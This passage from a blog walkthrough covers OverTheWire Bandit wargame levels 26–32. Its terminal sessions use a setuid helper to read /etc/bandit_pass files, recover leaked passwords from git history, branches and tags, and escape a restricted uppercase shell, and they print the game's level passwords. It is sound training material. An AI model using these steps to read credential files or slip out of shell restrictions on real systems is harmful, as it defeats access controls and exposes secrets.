class="highlight-line">5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</span><br><span class="highlight-line">bandit26@bandit:~$</span><br><span class="highlight-line">bandit26@bandit:~$ ls</span><br><span class="highlight-line">bandit27-do  shell/.txt</span><br><span class="highlight-line">bandit26@bandit:~$ cat shell/.txt</span><br><span class="highlight-line">  _                     _ _ _   ___   __</span><br><span class="highlight-line">| |                   | (_) | |__ \ / /</span><br><span class="highlight-line">| |__   __ _ _ __   __| |_| |_   ) / /_</span><br><span class="highlight-line">| '_ \ / _` | '_ \ / _` | | __| / / '_ \</span><br><span class="highlight-line">| |_) | (_| | | | | (_| | | |_ / /| (_) |</span><br><span class="highlight-line">|_.__/ \__,_|_| |_|\__,_|_|\__|____\___/</span><br><span class="highlight-line">bandit26@bandit:~$</span><br><span class="highlight-line">bandit26@bandit:~$ ls -la bandit27-do</span><br><span class="highlight-line">-rwsr-x--- 1 bandit27 bandit26 7296 May  7 20:14 bandit27-do</span><br><span class="highlight-line">bandit26@bandit:~$ ./bandit27-do</span><br><span class="highlight-line">Run a command as another user.</span><br><span class="highlight-line">  Example: ./bandit27-do id</span><br><mark class="highlight-line highlight-line-active">bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27</mark><br><span class="highlight-line">3ba3118a22e93127a4ed485be72ef5ea</span></code></pre>
<h4 id="level-27">Level 27 <a class="direct-link" href="#level-27">#</a></h4>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: clone a repository</span><br><ins class="highlight-line highlight-line-add">bandit27@bandit:~$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo /tmp/a130mb</ins><br><span class="highlight-line">Cloning into '/tmp/a130mb'...</span><br><span class="highlight-line">Could not create directory '/home/bandit27/.ssh'.</span><br><span class="highlight-line">  The authenticity of host 'localhost (127.0.0.1)' can't be established.</span><br><span class="highlight-line">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span><br><span class="highlight-line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="highlight-line">Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).</span><br><span class="highlight-line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="highlight-line"></span><br><span class="highlight-line">  bandit27-git@localhost's password:</span><br><span class="highlight-line">remote: Counting objects: 3, done.</span><br><span class="highlight-line">remote: Compressing objects: 100% (2/2), done.</span><br><span class="highlight-line">remote: Total 3 (delta 0), reused 0 (delta 0)</span><br><span class="highlight-line">Receiving objects: 100% (3/3), done.</span><br><span class="highlight-line">bandit27@bandit:~$ cd /tmp/a130mb</span><br><span class="highlight-line">bandit27@bandit:/tmp/a130mb$ ls</span><br><span class="highlight-line">README</span><br><ins class="highlight-line highlight-line-add">bandit27@bandit:/tmp/a130mb$ cat README</ins><br><span class="highlight-line">The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2</span><br><span class="highlight-line">bandit27@bandit:/tmp/a130mb$</span></code></pre>
<h4 id="level-28">Level 28 <a class="direct-link" href="#level-28">#</a></h4>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Find private information in a repository </span><br><span class="highlight-line"># Key insight: check the commit logs; checkout historic branch</span><br><span class="highlight-line">bandit28@bandit:~$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo /tmp/a130mb</span><br><span class="highlight-line">Cloning into '/tmp/a130mb'...</span><br><span class="highlight-line">Could not create directory '/home/bandit28/.ssh'.</span><br><span class="highlight-line">  The authenticity of host 'localhost (127.0.0.1)' can't be established.</span><br><span class="highlight-line">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span><br><span class="highlight-line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="highlight-line">Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).</span><br><span class="highlight-line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="highlight-line"></span><br><span class="highlight-line">  bandit28-git@localhost's password:</span><br><span class="highlight-line">remote: Counting objects: 9, done.</span><br><span class="highlight-line">remote: Compressing objects: 100% (6/6), done.</span><br><span class="highlight-line">remote: Total 9 (delta 2), reused 0 (delta 0)</span><br><span class="highlight-line">Receiving objects: 100% (9/9), done.</span><br><span class="highlight-line">Resolving deltas: 100% (2/2), done.</span><br><span class="highlight-line">bandit28@bandit:~$ cd /tmp/a130mb</span><br><span class="highlight-line">bandit28@bandit:/tmp/a130mb$ ls</span><br><span class="highlight-line">README.md</span><br><ins class="highlight-line highlight-line-add">bandit28@bandit:/tmp/a130mb$ cat README.md</ins><br><span class="highlight-line"># Level Notes</span><br><span class="highlight-line">Some notes for level29 of bandit.</span><br><span class="highlight-line"></span><br><span class="highlight-line">## credentials</span><br><span class="highlight-line"></span><br><span class="highlight-line">- username: bandit29</span><br><span class="highlight-line">- password: xxxxxxxxxx</span><br><span class="highlight-line"></span><br><span class="highlight-line">bandit28@bandit:/tmp/a130mb$ git log --oneline</span><br><del class="highlight-line highlight-line-remove">edd935d fix info leak</del><br><span class="highlight-line">c086d11 add missing data</span><br><span class="highlight-line">de2ebe2 initial commit of README.md</span><br><ins class="highlight-line highlight-line-add">bandit28@bandit:/tmp/a130mb$ git checkout de2ebe2</ins><br><span class="highlight-line">Note: checking out 'de2ebe2'.</span><br><span class="highlight-line"></span><br><span class="highlight-line">You are in 'detached HEAD' state. You can look around, make experimental</span><br><span class="highlight-line">changes and commit them, and you can discard any commits you make in this</span><br><span class="highlight-line">state without impacting any branches by performing another checkout.</span><br><span class="highlight-line"></span><br><span class="highlight-line">If you want to create a new branch to retain commits you create, you may</span><br><span class="highlight-line">do so (now or later) by using -b with the checkout command again. Example:</span><br><span class="highlight-line"></span><br><span class="highlight-line">  git checkout -b <new-branch-name></span><br><span class="highlight-line"></span><br><span class="highlight-line">HEAD is now at de2ebe2... initial commit of README.md</span><br><ins class="highlight-line highlight-line-add">bandit28@bandit:/tmp/a130mb$ cat README.md</ins><br><span class="highlight-line"># Level Notes</span><br><span class="highlight-line">Some notes for level29 of bandit.</span><br><span class="highlight-line"></span><br><span class="highlight-line">## credentials</span><br><span class="highlight-line"></span><br><span class="highlight-line">- username: bandit29</span><br><span class="highlight-line">- password: <TBD></span><br><span class="highlight-line"></span><br><ins class="highlight-line highlight-line-add">bandit28@bandit:/tmp/a130mb$ git checkout c086d11</ins><br><span class="highlight-line">Previous HEAD position was de2ebe2... initial commit of README.md</span><br><span class="highlight-line">HEAD is now at c086d11... add missing data</span><br><ins class="highlight-line highlight-line-add">bandit28@bandit:/tmp/a130mb$ cat README.md</ins><br><span class="highlight-line"># Level Notes</span><br><span class="highlight-line">Some notes for level29 of bandit.</span><br><span class="highlight-line"></span><br><span class="highlight-line">## credentials</span><br><span class="highlight-line"></span><br><span class="highlight-line">- username: bandit29</span><br><span class="highlight-line">- password: bbc96594b4e001778eee9975372716b2</span><br><span class="highlight-line">bbc96594b4e001778eee9975372716b2</span><br><span class="highlight-line"></span><br><span class="highlight-line">bandit28@bandit:/tmp/a130mb$</span></code></pre>
<h4 id="level-29">Level 29 <a class="direct-link" href="#level-29">#</a></h4>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Find private information in repository branches</span><br><span class="highlight-line">bandit29@bandit:~$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo /tmp/a130mb</span><br><span class="highlight-line">Cloning into '/tmp/a130mb'...</span><br><span class="highlight-line">Could not create directory '/home/bandit29/.ssh'.</span><br><span class="highlight-line">The authenticity of host 'localhost (127.0.0.1)' can't be established.</span><br><span class="highlight-line">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span><br><span class="highlight-line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="highlight-line">Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts).</span><br><span class="highlight-line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="highlight-line"></span><br><span class="highlight-line">bandit29-git@localhost's password:</span><br><span class="highlight-line">remote: Counting objects: 16, done.</span><br><span class="highlight-line">remote: Compressing objects: 100% (11/11), done.</span><br><span class="highlight-line">remote: Total 16 (delta 2), reused 0 (delta 0)</span><br><span class="highlight-line">Receiving objects: 100% (16/16), 1.43 KiB | 0 bytes/s, done.</span><br><span class="highlight-line">Resolving deltas: 100% (2/2), done.</span><br><span class="highlight-line">bandit29@bandit:~$ cd /tmp/a130mb</span><br><span class="highlight-line">bandit29@bandit:/tmp/a130mb$ ls</span><br><span class="highlight-line">README.md</span><br><span class="highlight-line">bandit29@bandit:/tmp/a130mb$ cat README.md</span><br><span class="highlight-line"># Level Notes</span><br><span class="highlight-line">Some notes for bandit30 of bandit.</span><br><span class="highlight-line"></span><br><span class="highlight-line">## credentials</span><br><span class="highlight-line"></span><br><span class="highlight-line">- username: bandit30</span><br><span class="highlight-line">- password: <no passwords in production!></span><br><span class="highlight-line"></span><br><span class="highlight-line">bandit29@bandit:/tmp/a130mb$</span><br><span class="highlight-line">bandit29@bandit:/tmp/a130mb$ git branch -a</span><br><span class="highlight-line">  clear</span><br><span class="highlight-line">* master</span><br><span class="highlight-line">  remotes/origin/HEAD -> origin/master</span><br><span class="highlight-line">  remotes/origin/dev</span><br><span class="highlight-line">  remotes/origin/master</span><br><span class="highlight-line">  remotes/origin/sploits-dev</span><br><ins class="highlight-line highlight-line-add">bandit29@bandit:/tmp/a130mb$ git checkout dev</ins><br><span class="highlight-line">Branch dev set up to track remote branch dev from origin.</span><br><span class="highlight-line">Switched to a new branch 'dev'</span><br><span class="highlight-line">bandit29@bandit:/tmp/a130mb$ ls</span><br><span class="highlight-line">code  README.md</span><br><ins class="highlight-line highlight-line-add">bandit29@bandit:/tmp/a130mb$ cat README.md</ins><br><span class="highlight-line"># Level Notes</span><br><span class="highlight-line">Some notes for bandit30 of bandit.</span><br><span class="highlight-line"></span><br><span class="highlight-line">## credentials</span><br><span class="highlight-line"></span><br><span class="highlight-line">- username: bandit30</span><br><span class="highlight-line">- password: 5b90576bedb2cc04c86a9e924ce42faf</span><br><span class="highlight-line">5b90576bedb2cc04c86a9e924ce42faf</span><br><span class="highlight-line"></span><br><span class="highlight-line">bandit29@bandit:/tmp/a130mb$</span></code></pre>
<h4 id="level-30">Level 30 <a class="direct-link" href="#level-30">#</a></h4>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Find private information in a repository using tag branches </span><br><span class="highlight-line">bandit30@bandit:~$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo</span><br><span class="highlight-line">fatal: could not create work tree dir 'repo': Permission denied</span><br><span class="highlight-line">bandit30@bandit:~$ set -o vi</span><br><span class="highlight-line">bandit30@bandit:~$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo /tmp/a130mb</span><br><span class="highlight-line">Cloning into '/tmp/a130mb'...</span><br><span class="highlight-line">Could not create directory '/home/bandit30/.ssh'.</span><br><span class="highlight-line">  The authenticity of host 'localhost (127.0.0.1)' can't be established.</span><br><span class="highlight-line">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span><br><span class="highlight-line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="highlight-line">Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts).</span><br><span class="highlight-line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="highlight-line"></span><br><span class="highlight-line">  bandit30-git@localhost's password:</span><br><span class="highlight-line">remote: Counting objects: 4, done.</span><br><span class="highlight-line">remote: Total 4 (delta 0), reused 0 (delta 0)</span><br><span class="highlight-line">Receiving objects: 100% (4/4), done.</span><br><span class="highlight-line">bandit30@bandit:~$ cd /tmp/a130mb</span><br><span class="highlight-line">bandit30@bandit:/tmp/a130mb$ ls</span><br><span class="highlight-line">README.md</span><br><ins class="highlight-line highlight-line-add">bandit30@bandit:/tmp/a130mb$ cat README.md</ins><br><span class="highlight-line">just an epmty file... muahaha</span><br><span class="highlight-line">bandit30@bandit:/tmp/a130mb$</span><br><span class="highlight-line">bandit30@bandit:/tmp/a130mb$ ls -la</span><br><span class="highlight-line">total 844</span><br><span class="highlight-line">drwxr-sr-x    3 bandit30 root   4096 Aug 31 04:18 .</span><br><span class="highlight-line">drwxrws-wt 3930 root     root 847872 Aug 31 04:22 ..</span><br><span class="highlight-line">drwxr-sr-x    8 bandit30 root   4096 Aug 31 04:20 .git</span><br><span class="highlight-line">-rw-r--r--    1 bandit30 root     30 Aug 31 04:18 README.md</span><br><ins class="highlight-line highlight-line-add">bandit30@bandit:/tmp/a130mb$ cd .git/</ins><br><span class="highlight-line">bandit30@bandit:/tmp/a130mb/.git$ ls -la</span><br><span class="highlight-line">total 52</span><br><span class="highlight-line">drwxr-sr-x 8 bandit30 root 4096 Aug 31 04:20 .</span><br><span class="highlight-line">drwxr-sr-x 3 bandit30 root 4096 Aug 31 04:18 ..</span><br><span class="highlight-line">drwxr-sr-x 2 bandit30 root 4096 Aug 31 04:18 branches</span><br><span class="highlight-line">-rw-r--r-- 1 bandit30 root  276 Aug 31 04:18 config</span><br><span class="highlight-line">-rw-r--r-- 1 bandit30 root   73 Aug 31 04:18 description</span><br><span class="highlight-line">-rw-r--r-- 1 bandit30 root    0 Aug 31 04:19 FETCH_HEAD</span><br><span class="highlight-line">-rw-r--r-- 1 bandit30 root   23 Aug 31 04:20 HEAD</span><br><span class="highlight-line">drwxr-sr-x 2 bandit30 root 4096 Aug 31 04:18 hooks</span><br><span class="highlight-line">-rw-r--r-- 1 bandit30 root  137 Aug 31 04:20 index</span><br><span class="highlight-line">drwxr-sr-x 2 bandit30 root 4096 Aug 31 04:18 info</span><br><span class="highlight-line">drwxr-sr-x 3 bandit30 root 4096 Aug 31 04:18 logs</span><br><span class="highlight-line">drwxr-sr-x 4 bandit30 root 4096 Aug 31 04:18 objects</span><br><span class="highlight-line">-rw-r--r-- 1 bandit30 root  165 Aug 31 04:18 packed-refs</span><br><span class="highlight-line">drwxr-sr-x 5 bandit30 root 4096 Aug 31 04:18 refs</span><br><ins class="highlight-line highlight-line-add">bandit30@bandit:/tmp/a130mb/.git$ cat packed-refs</ins><br><span class="highlight-line"># pack-refs with: peeled fully-peeled</span><br><span class="highlight-line">3aefa229469b7ba1cc08203e5d8fa299354c496b refs/remotes/origin/master</span><br><span class="highlight-line">f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret</span><br><ins class="highlight-line highlight-line-add">bandit30@bandit:/tmp/a130mb/.git$ git show secret</ins><br><span class="highlight-line">47e603bb428404d265f59c42920d81e5</span><br><span class="highlight-line">bandit30@bandit:/tmp/a130mb/.git$</span></code></pre>
<h4 id="level-31">Level 31 <a class="direct-link" href="#level-31">#</a></h4>
<pre class="language-text"><code class="language-text"><span class="highlight-line"> Objective: Find private information in repository by trigger git hooks</span><br><span class="highlight-line">bandit31@bandit:~$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo /tmp/a130mb</span><br><span class="highlight-line">Cloning into '/tmp/a130mb'...</span><br><span class="highlight-line">Could not create directory '/home/bandit31/.ssh'.</span><br><span class="highlight-line">  The authenticity of host 'localhost (127.0.0.1)' can't be established.</span><br><span class="highlight-line">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span><br><span class="highlight-line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="highlight-line">Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).</span><br><span class="highlight-line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="highlight-line"></span><br><span class="highlight-line">  bandit31-git@localhost's password:</span><br><span class="highlight-line">remote: Counting objects: 4, done.</span><br><span class="highlight-line">remote: Compressing objects: 100% (3/3), done.</span><br><span class="highlight-line">remote: Total 4 (delta 0), reused 0 (delta 0)</span><br><span class="highlight-line">Receiving objects: 100% (4/4), 383 bytes | 0 bytes/s, done.</span><br><span class="highlight-line">bandit31@bandit:~$ cd /tmp/a130mb</span><br><span class="highlight-line">bandit31@bandit:/tmp/a130mb$</span><br><span class="highlight-line">bandit31@bandit:/tmp/a130mb$ ls</span><br><span class="highlight-line">README.md</span><br><ins class="highlight-line highlight-line-add">bandit31@bandit:/tmp/a130mb$ cat README.md</ins><br><del class="highlight-line highlight-line-remove">This time your task is to push a file to the remote repository.</del><br><del class="highlight-line highlight-line-remove"></del><br><del class="highlight-line highlight-line-remove">Details:</del><br><del class="highlight-line highlight-line-remove">    File name: key.txt</del><br><del class="highlight-line highlight-line-remove">    Content: 'May I come in?'</del><br><del class="highlight-line highlight-line-remove">    Branch: master</del><br><del class="highlight-line highlight-line-remove"></del><br><ins class="highlight-line highlight-line-add">bandit31@bandit:/tmp/a130mb$ echo 'May I come in?' > key.txt</ins><br><ins class="highlight-line highlight-line-add">bandit31@bandit:/tmp/a130mb$ git add key.txt</ins><br><ins class="highlight-line highlight-line-add">bandit31@bandit:/tmp/a130mb$ git commit -m 'added key.txt'</ins><br><span class="highlight-line">[master 07c7910] added key.txt</span><br><span class="highlight-line">1 file changed, 1 insertion(+)</span><br><span class="highlight-line">create mode 100644 key.txt</span><br><ins class="highlight-line highlight-line-add">bandit31@bandit:/tmp/a130mb$ git push</ins><br><span class="highlight-line">Could not create directory '/home/bandit31/.ssh'.</span><br><span class="highlight-line">The authenticity of host 'localhost (127.0.0.1)' can't be established.</span><br><span class="highlight-line">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span><br><span class="highlight-line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="highlight-line">Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).</span><br><span class="highlight-line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="highlight-line"></span><br><span class="highlight-line">bandit31-git@localhost's password:</span><br><span class="highlight-line">Counting objects: 3, done.</span><br><span class="highlight-line">Delta compression using up to 2 threads.</span><br><span class="highlight-line">Compressing objects: 100% (2/2), done.</span><br><span class="highlight-line">Writing objects: 100% (3/3), 323 bytes | 0 bytes/s, done.</span><br><span class="highlight-line">Total 3 (delta 0), reused 0 (delta 0)</span><br><span class="highlight-line">remote: ### Attempting to validate files... ####</span><br><span class="highlight-line">remote:</span><br><span class="highlight-line">remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.</span><br><span class="highlight-line">remote:</span><br><span class="highlight-line">remote: Well done! Here is the password for the next level:</span><br><span class="highlight-line">remote: 56a9bf19c63d650ce78e6ec0354ee45e</span><br><span class="highlight-line">remote:</span><br><span class="highlight-line">remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.</span><br><span class="highlight-line">remote:</span><br><span class="highlight-line">To ssh://localhost/home/bandit31-git/repo</span><br><span class="highlight-line">! [remote rejected] master -> master (pre-receive hook declined)</span><br><span class="highlight-line">error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'</span><br><span class="highlight-line">56a9bf19c63d650ce78e6ec0354ee45e</span></code></pre>
<h4 id="level-32">Level 32 <a class="direct-link" href="#level-32">#</a></h4>
<pre class="language-text"><code class="language-text"><span class="highlight-line"># Objective: Spawn a new shell</span><br><span class="highlight-line">WELCOME TO THE UPPERCASE SHELL</span><br><span class="highlight-line">>></span><br><span class="highlight-line">>> echo</span><br><span class="highlight-line">sh: 1: ECHO: not found</span><br><ins class="highlight-line highlight-line-add">>> $0</ins><br><span class="highlight-line">$ bash</span><br><span class="highlight-line">bandit33@bandit:~$ ls</span><br><span class="highlight-line">uppershell</span><br><span class="highlight-line">bandit33@bandit:~$ ls -la uppershell</span><br><span class="highlight-line">-rwsr-x--- 1 bandit33 bandit32 7556 May  7 20:14 uppershell</span><br><span class="highlight-line">bandit33@bandit:~$ cat /etc/bandit_pass/bandit33</span><br><span class="highlight-line">c9c3199ddf4121b10cf581a98d51caee</span></code></pre>


<hr>
<ul><li>Next: <a href="/posts/century/">Century</a></li>
</ul>
    </main>

    <footer></footer>

    <!-- Current page: /posts/bandit/ -->
  </body>
</html>
